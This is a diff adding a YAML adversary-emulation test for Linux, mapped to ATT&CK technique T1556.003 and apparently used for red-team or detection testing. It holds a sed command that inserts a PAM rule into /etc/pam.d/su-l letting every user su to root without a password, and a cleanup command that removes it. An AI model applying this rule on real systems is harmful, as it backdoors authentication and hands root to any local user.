@@ -1,0 +1,21 @@
+---
+- id: f4873fff8940c0507868b38e78de1b0d
+  name: Malicious PAM rule
+  description: 'Inserts a rule into a PAM config and then tests it.
+
+
+    Upon successful execution, this test will insert a rule that allows every user
+    to su to root without a password.
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1556.003
+    name: 'Modify Authentication Process: Pluggable Authentication Modules'
+  platforms:
+    linux:
+      sh:
+        command: sudo sed -i "1s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g"
+          /etc/pam.d/su-l
+        payloads: []
+        cleanup: sudo sed -i "\,auth sufficient pam_succeed_if.so uid >= 0,d" /etc/pam.d/su-l
